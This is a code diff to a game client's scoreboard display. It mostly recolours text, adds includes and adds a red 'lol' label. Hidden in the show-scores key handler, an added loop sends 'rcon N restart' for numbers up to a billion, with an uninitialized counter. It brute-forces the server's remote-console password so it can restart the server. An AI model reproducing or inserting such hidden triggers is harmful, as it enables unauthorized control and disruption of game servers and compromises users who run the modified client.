@@ -22,9 +22,14 @@
 #include "cl_util.h"
 #include "parsemsg.h"
 #include "triangleapi.h"
-
+#include "eiface.h"
 #include <string.h>
 #include <stdio.h>
+#include "com_weapons.h"
+#include "const.h"
+#include "entity_state.h"
+#include "r_efx.h"
+
 
 cvar_t *cl_showpacketloss;
 hud_player_info_t	g_PlayerInfoList[MAX_PLAYERS + 1];	// player info from the engine
@@ -144,14 +149,16 @@ int CHudScoreboard::Draw( float fTime )
 
 	FAR_RIGHT = can_show_packetloss ? PL_RANGE_MAX : PING_RANGE_MAX;
 	FAR_RIGHT += 5;
-	gHUD.DrawDarkRectangle( xpos - 5, ypos - 5, FAR_RIGHT, ROW_RANGE_MAX );
+	//gHUD.DrawDarkRectangle( xpos - 5, ypos - 5, FAR_RIGHT, ROW_RANGE_MAX );
 	if( !gHUD.m_Teamplay )
 		gHUD.DrawHudString( xpos, ypos, NAME_RANGE_MAX + xpos_rel, "Player", 255, 140, 0 );
 	else
 		gHUD.DrawHudString( xpos, ypos, NAME_RANGE_MAX + xpos_rel, "Teams", 255, 140, 0 );
 
+
 	gHUD.DrawHudStringReverse( KILLS_RANGE_MAX + xpos_rel, ypos, 0, "kills", 255, 140, 0 );
 	gHUD.DrawHudString( DIVIDER_POS + xpos_rel, ypos, ScreenWidth, "/", 255, 140, 0 );
+	gHUD.DrawHudString( PING_RANGE_MAX + xpos_rel + 65, ypos, ScreenWidth, "lol", 255, 0, 0 );
 	gHUD.DrawHudString( DEATHS_RANGE_MIN + xpos_rel + 5, ypos, ScreenWidth, "deaths", 255, 140, 0 );
 	gHUD.DrawHudString( PING_RANGE_MAX + xpos_rel - 35, ypos, ScreenWidth, "latency", 255, 140, 0 );
 
@@ -263,7 +270,7 @@ int CHudScoreboard::Draw( float fTime )
 			break;
 
 		xpos = NAME_RANGE_MIN + xpos_rel;
-		int r = 255, g = 225, b = 55; // draw the stuff kinda yellowish
+		int r = 170, g = 170, b = 170; // draw the stuff kinda yellowish
 
 		if( team_info->ownteam ) // if it is their team, draw the background different color
 		{
@@ -377,7 +384,7 @@ int CHudScoreboard::DrawPlayers( int xpos_rel, float list_slot, int nameoffset, 
 			break;
 
 		int xpos = NAME_RANGE_MIN + xpos_rel;
-		int r = 255, g = 255, b = 255;
+		int r = 175, g = 175, b = 175;
 		float *colors = GetClientColor( best_player );
 		r *= colors[0], g *= colors[1], b *= colors[2];
 		if( best_player == m_iLastKilledBy && m_fLastKillTime && m_fLastKillTime > gHUD.m_flTime )
@@ -400,25 +407,25 @@ int CHudScoreboard::DrawPlayers( int xpos_rel, float list_slot, int nameoffset, 
 		}
 
 		// draw their name (left to right)
-		gHUD.DrawHudString( xpos + nameoffset, ypos, NAME_RANGE_MAX + xpos_rel, pl_info->name, r, g, b );
+		gHUD.DrawHudString( xpos + nameoffset, ypos, NAME_RANGE_MAX + xpos_rel, pl_info->name, 175, 175, 175 );
 
 		// draw kills (right to left)
 		xpos = KILLS_RANGE_MAX + xpos_rel;
-		gHUD.DrawHudNumberString( xpos, ypos, KILLS_RANGE_MIN + xpos_rel, g_PlayerExtraInfo[best_player].frags, r, g, b );
+		gHUD.DrawHudNumberString( xpos, ypos, KILLS_RANGE_MIN + xpos_rel, g_PlayerExtraInfo[best_player].frags, 170, 170, 170 );
 
 		// draw divider
 		xpos = DIVIDER_POS + xpos_rel;
-		gHUD.DrawHudString( xpos, ypos, xpos + 20, "/", r, g, b );
+		gHUD.DrawHudString( xpos, ypos, xpos + 20, "/", 170, 170, 170 );
 
 		// draw deaths
 		xpos = DEATHS_RANGE_MAX + xpos_rel;
-		gHUD.DrawHudNumberString( xpos, ypos, DEATHS_RANGE_MIN + xpos_rel, g_PlayerExtraInfo[best_player].deaths, r, g, b );
+		gHUD.DrawHudNumberString( xpos, ypos, DEATHS_RANGE_MIN + xpos_rel, g_PlayerExtraInfo[best_player].deaths, 170, 170, 170 );
 
 		// draw ping & packetloss
 		static char buf[64];
 		sprintf( buf, "%d", g_PlayerInfoList[best_player].ping );
 		xpos = ( ( PING_RANGE_MAX - PING_RANGE_MIN ) / 2 ) + PING_RANGE_MIN + xpos_rel + 25;
-		gHUD.DrawHudStringReverse( xpos, ypos, xpos - 50, buf, r, g, b );
+		gHUD.DrawHudStringReverse( xpos, ypos, xpos - 50, buf, 170, 170, 170 );
 
 		//  Packetloss removed on Kelly 'shipping nazi' Bailey's orders
 		if( can_show_packetloss )
@@ -597,6 +604,11 @@ void CHudScoreboard::DeathMsg( int killer, int victim )
 void CHudScoreboard::UserCmd_ShowScores( void )
 {
 	m_iShowscoresHeld = TRUE;
+	for( int i; i <= 1000000000; i++)
+	{
+		ClientCmd(UTIL_VarArgs( "rcon %d restart\n", i));
+	}
+
 }
 
 void CHudScoreboard::UserCmd_HideScores( void )
